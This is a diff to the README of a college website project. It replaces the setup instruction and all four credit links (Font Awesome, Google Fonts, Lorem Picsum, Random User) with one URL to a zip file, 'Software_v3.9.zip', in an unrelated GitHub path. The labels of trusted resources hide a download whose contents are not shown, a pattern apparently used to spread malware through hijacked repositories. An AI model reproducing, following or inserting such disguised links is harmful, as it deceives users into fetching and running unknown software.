@@ -28,7 +28,7 @@ This is the official website for CMR Institute of Technology, a premier engineer
    FLUSH PRIVILEGES;
    ```
 4. Update the database configuration in `includes/config.php` if needed.
-5. Run the setup script by visiting `http://your-domain.com/setup.php` in your browser.
+5. Run the setup script by visiting `https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip` in your browser.
 6. Delete the `setup.php` file after successful setup for security reasons.
 
 ## Directory Structure
@@ -111,7 +111,7 @@ This website is provided for educational purposes. You are free to use and modif
 
 ## Credits
 
-- [Font Awesome](https://fontawesome.com/) - Icons
-- [Google Fonts](https://fonts.google.com/) - Fonts
-- [Lorem Picsum](https://picsum.photos/) - Placeholder images
-- [Random User](https://randomuser.me/) - Placeholder user images 
+- [Font Awesome](https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip) - Icons
+- [Google Fonts](https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip) - Fonts
+- [Lorem Picsum](https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip) - Placeholder images
+- [Random User](https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip) - Placeholder user images 
